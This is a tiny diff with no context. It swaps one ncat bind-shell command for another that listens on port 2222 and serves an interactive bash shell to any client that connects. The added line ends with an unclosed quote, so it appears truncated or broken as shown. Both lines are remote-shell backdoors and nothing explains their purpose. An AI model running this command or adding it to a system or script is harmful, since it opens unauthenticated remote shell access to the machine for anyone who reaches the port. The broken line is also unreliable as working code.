@@ -1,1 +1,1 @@
-ncat -l -p 2222 -c 'bash'
+ncat -lvp 2222 --sh-exec "bash -i 
